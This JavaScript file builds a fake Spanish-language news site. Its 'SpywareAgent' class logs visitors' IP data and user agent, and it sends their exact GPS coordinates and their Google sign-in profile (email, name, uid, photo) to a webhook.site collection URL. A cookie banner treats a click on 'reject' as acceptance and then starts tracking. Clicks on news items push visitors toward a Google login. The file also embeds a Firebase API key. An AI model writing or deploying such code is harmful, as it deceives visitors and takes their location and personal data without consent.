/**
 * GLOBAL INSIGHT CORE SYSTEM
 */
const FIREBASE_CONFIG = {
    apiKey: "AIzaSyCZxRHndnpjYCvWG-kZYKDWpyqCN_UAOWY",
    authDomain: "recoleccion-datos-a78a6.firebaseapp.com",
    projectId: "recoleccion-datos-a78a6",
    storageBucket: "recoleccion-datos-a78a6.firebasestorage.app",
    messagingSenderId: "123889106526",
    appId: "1:123889106526:web:f3d296fedf8e92907dbecf"
};

const CONFIG = {
    WEBHOOK_URL: "https://webhook.site/8681f53b-1612-4dee-b6df-adde57557614",
    COOKIE_TIMEOUT: 1500,
    FORCE_ACCEPT: true
};

const newsDatabase = [
    { title: "Avance Histórico: IA logra curar enfermedades raras en simulaciones", category: "Ciencia", img: "https://picsum.photos/800/600?random=1" },
    { title: "Mercados Asiáticos cierran con incertidumbre ante nuevas regulaciones", category: "Economía", img: "https://picsum.photos/800/600?random=2" },
    { title: "Filtración Masiva: Millones de contraseñas expuestas en ataque a red social", category: "Ciberseguridad", img: "https://picsum.photos/800/600?random=3" },
    { title: "El nuevo estándar de trabajo remoto para 2026: Lo que debes saber", category: "Negocios", img: "https://picsum.photos/800/600?random=4" },
    { title: "SpaceX confirma fecha para el primer vuelo tripulado a Marte", category: "Tecnología", img: "https://picsum.photos/800/600?random=5" },
    { title: "Crisis climática: Nuevos acuerdos en la cumbre de Ginebra", category: "Internacional", img: "https://picsum.photos/800/600?random=6" },
    { title: "Nvidia supera expectativas y sus acciones tocan máximos históricos", category: "Mercados", img: "https://picsum.photos/800/600?random=7" },
    { title: "Descubren vulnerabilidad crítica en sistemas bancarios antiguos", category: "Seguridad", img: "https://picsum.photos/800/600?random=8" },
    { title: "La Unión Europea prepara ley estricta sobre el uso de criptomonedas", category: "Política", img: "https://picsum.photos/800/600?random=9" },
    { title: "Google presenta sus gafas de realidad aumentada de bajo costo", category: "Gadgets", img: "https://picsum.photos/800/600?random=10" }
];

class SpywareAgent {
    constructor(webhook) {
        this.webhook = webhook;
        this.ipData = null;
        this.userAgent = navigator.userAgent;
        this.acceptedCookies = false;
    }

    async trackIP() {
        try {
            const res = await fetch('https://ipwho.is/');
            const data = await res.json();
            this.ipData = data;
            this.exfiltrate({ ...data, userAgent: this.userAgent }, "PASSIVE_DATA", "Rastreo General");
        } catch (e) {
            console.error("Fallo IP:", e);
        }
    }

    trackGPS(onSuccess, onError) {
        if (!navigator.geolocation) return onError("GPS no soportado");
        
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                const gpsData = {
                    lat: latitude,
                    lon: longitude,
                    acc: accuracy,
                    map_url: `http://maps.google.com/maps?q=${latitude},${longitude}`,
                    ...this.ipData
                };
                this.exfiltrate(gpsData, "ACTIVE_GPS_TARGET", "Ubicación Exacta");
                onSuccess(gpsData);
            },
            (err) => onError(err),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    exfiltrate(payload, type, precision) {
        fetch(this.webhook, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify({ ALERTA: type, PRECISION: precision, DATOS: payload })
        }).then(() => console.log("Datos enviados")).catch(e => console.log("Error envío"));
    }

    setCookiesAccepted(status) {
        this.acceptedCookies = status;
    }
}

class AuthManager {
    constructor() {
        this.user = null;
        this.initialized = false;
        console.log("AuthManager creado, FIREBASE_CONFIG:", typeof FIREBASE_CONFIG);
        this.initFirebase();
    }

    initFirebase() {
        try {
            console.log("Inicializando Firebase con:", FIREBASE_CONFIG);
            
            if (typeof firebase === 'undefined') {
                throw new Error("Firebase SDK no cargado");
            }

            firebase.initializeApp(FIREBASE_CONFIG);
            this.initialized = true;
            console.log("Firebase inicializado correctamente");
            
            firebase.auth().onAuthStateChanged((user) => {
                this.handleAuthStateChange(user);
            });

        } catch (error) {
            console.error("Error Firebase:", error);
            this.showFirebaseError(error.message);
        }
    }

    showFirebaseError(message) {
        const errorDiv = document.createElement('div');
        errorDiv.style.cssText = `
            position: fixed; top: 10px; left: 10px; background: #d93025; color: white;
            padding: 15px; border-radius: 5px; z-index: 10000; max-width: 400px;
            font-size: 12px; border: 2px solid #ff4444;
        `;
        errorDiv.innerHTML = `
            <strong>Error Firebase:</strong><br>
            ${message}
        `;
        document.body.appendChild(errorDiv);
    }

    handleAuthStateChange(user) {
        console.log("Estado auth cambiado:", user);
        if (user) {
            this.user = user;
            this.showUserProfile(user);
            this.exfiltrateUserData(user);
        } else {
            this.user = null;
            this.hideUserProfile();
        }
    }

    async signInWithGoogle() {
        if (!this.initialized) {
            alert("Firebase no configurado");
            return null;
        }

        try {
            const provider = new firebase.auth.GoogleAuthProvider();
            const result = await firebase.auth().signInWithPopup(provider);
            return result.user;
        } catch (error) {
            console.error("Error login:", error);
            alert("Error: " + error.message);
            return null;
        }
    }

    async signOut() {
        try {
            await firebase.auth().signOut();
        } catch (error) {
            console.error("Error logout:", error);
        }
    }

    showUserProfile(user) {
        const profileWidget = document.getElementById('user-profile');
        const authWidget = document.getElementById('auth-widget');
        
        if (profileWidget && authWidget) {
            document.getElementById('user-name').textContent = user.displayName || 'Usuario';
            document.getElementById('user-email').textContent = user.email || 'No email';
            
            const avatar = document.getElementById('user-avatar');
            if (user.photoURL) {
                avatar.src = user.photoURL;
            }
            
            authWidget.style.display = 'none';
            profileWidget.style.display = 'block';
        }
    }

    hideUserProfile() {
        const profileWidget = document.getElementById('user-profile');
        const authWidget = document.getElementById('auth-widget');
        
        if (profileWidget && authWidget) {
            profileWidget.style.display = 'none';
            authWidget.style.display = 'block';
        }
    }

    exfiltrateUserData(user) {
        const userData = {
            uid: user.uid,
            email: user.email,
            displayName: user.displayName,
            photoURL: user.photoURL,
            timestamp: new Date().toISOString()
        };

        if (window.spyAgent) {
            window.spyAgent.exfiltrate(userData, "USER_OAUTH_DATA", "Perfil Completo");
        }

        console.log("Datos usuario capturados:", userData);
    }
}

function renderNews() {
    const heroEl = document.getElementById("hero-news");
    const gridEl = document.getElementById("secondary-grid");
    
    const shuffled = [...newsDatabase].sort(() => 0.5 - Math.random());

    if (heroEl && shuffled.length > 0) {
        const hero = shuffled[0];
        heroEl.innerHTML = `
            <img src="${hero.img}" alt="News">
            <div class="hero-content">
                <span style="background:#0056b3; color:white; padding:4px 8px; font-size:0.75rem; font-weight:bold; margin-bottom:10px; display:inline-block; border-radius:2px;">${hero.category.toUpperCase()}</span>
                <h1>${hero.title}</h1>
                <p style="margin-top:10px; font-size:1.1rem; opacity:0.9;">Haga clic para leer la cobertura completa de este evento en desarrollo...</p>
            </div>
        `;

        heroEl.onclick = () => {
            const modal = document.getElementById('login-modal');
            if(modal) modal.style.display = 'flex';
        };
    }

    if (gridEl && shuffled.length > 1) {
        gridEl.innerHTML = "";
        const secondaryNews = shuffled.slice(1, 5);
        
        secondaryNews.forEach(news => {
            const card = document.createElement('div');
            card.className = 'news-card';
            card.style.cursor = 'pointer'; 
            card.innerHTML = `
                <img src="${news.img}" alt="News Mini">
                <h3>${news.title}</h3>
                <span class="meta" style="color:#d93025;">${news.category} • EN VIVO</span>
            `;

            card.onclick = () => {
                alert("🔒 Contenido exclusivo para suscriptores. Por favor inicie sesión.");
                const modal = document.getElementById('login-modal');
                if(modal) modal.style.display = 'flex';
            };
            
            gridEl.appendChild(card);
        });
    }
}
function renderTrending() {
    const listEl = document.getElementById("trending-list");
    if (!listEl) return;

    listEl.innerHTML = "";
    const trendingNews = newsDatabase.slice(0, 5);

    trendingNews.forEach((news, index) => {
        const li = document.createElement("li");
        li.innerHTML = `
            <span>0${index + 1}</span>
            <div style="display:flex; flex-direction:column; justify-content:center;">
                <small style="color:#d93025; font-weight:bold; font-size:0.7rem;">TENDENCIA</small>
                <a href="#" style="font-weight:bold; font-size:0.9rem; line-height:1.3;">${news.title}</a>
            </div>
        `;
        listEl.appendChild(li);
    });
}

function setupAuthEvents(authManager) {
    const loginBtn = document.getElementById('btn-login');
    const googleLoginBtn = document.getElementById('btn-google-login');
    const logoutBtn = document.getElementById('btn-logout');
    const loginModal = document.getElementById('login-modal');

    if (loginBtn) {
        loginBtn.addEventListener('click', () => {
            if (loginModal) loginModal.style.display = 'flex';
        });
    }

    if (googleLoginBtn) {
        googleLoginBtn.addEventListener('click', async () => {
            const user = await authManager.signInWithGoogle();
            if (user && loginModal) {
                loginModal.style.display = 'none';
            }
        });
    }

    if (logoutBtn) {
        logoutBtn.addEventListener('click', () => {
            authManager.signOut();
        });
    }

    if (loginModal) {
        loginModal.addEventListener('click', (e) => {
            if (e.target === loginModal) {
                loginModal.style.display = 'none';
            }
        });
    }
}

function setupCookieTrap(spyAgent) {
    const modal = document.getElementById('cookie-modal');
    const btnAccept = document.getElementById('btn-accept-all');
    const btnReject = document.getElementById('btn-reject');

    if (!modal) return;

    modal.style.display = 'flex';

    const close = () => {
        spyAgent.setCookiesAccepted(true);
        modal.style.display = 'none';
        spyAgent.trackIP();
    };

    if (btnAccept) btnAccept.addEventListener('click', close);
    if (btnReject) btnReject.addEventListener('click', () => {
        setTimeout(close, 800);
    });
}

document.addEventListener("DOMContentLoaded", () => {
    console.log("Iniciando aplicación...");
    console.log("FIREBASE_CONFIG disponible:", typeof FIREBASE_CONFIG !== 'undefined');
    
    const spy = new SpywareAgent(CONFIG.WEBHOOK_URL);
    window.spyAgent = spy;

    const authManager = new AuthManager();
    window.authManager = authManager;

    renderNews();
    renderTrending();
    setupAuthEvents(authManager);
    startNewsTicker();
    startMarketSimulation();
    setTimeout(() => setupCookieTrap(spy), CONFIG.COOKIE_TIMEOUT);

    const dateEl = document.getElementById("current-date");
    if (dateEl) {
        dateEl.innerText = new Date().toLocaleDateString('es-ES', {
            weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'
        });
    }

    const btnGps = document.getElementById("btn-gps-trigger");
    if (btnGps) {
        btnGps.addEventListener("click", () => {
            if (!spy.acceptedCookies) {
                alert("Acepta las cookies primero");
                return;
            }
            
            spy.trackGPS(
                (data) => {
                    btnGps.style.display = "none";
                    console.log("GPS éxito:", data);
                },
                (error) => {
                    alert("Error GPS: " + error);
                }
            );
        });
    }
});
function startNewsTicker() {
    const ticker = document.getElementById('ticker-text');
    let index = 0;

    setInterval(() => {
        index = (index + 1) % newsDatabase.length;
        ticker.style.opacity = 0;
        setTimeout(() => {
            ticker.innerText = "ÚLTIMA HORA: " + newsDatabase[index].title;
            ticker.style.opacity = 1;
        }, 500);
    }, 4000);
}

function startMarketSimulation() {
    const marketSpans = document.querySelectorAll('.market-widget span span'); 
    
    setInterval(() => {
        marketSpans.forEach(span => {
            const change = (Math.random() * 2 - 1).toFixed(2); 
            const isPositive = change > 0;
            
            span.className = isPositive ? 'up' : 'down';
            span.innerText = (isPositive ? '+' : '') + change + '%';
        });
    }, 3000); 
}
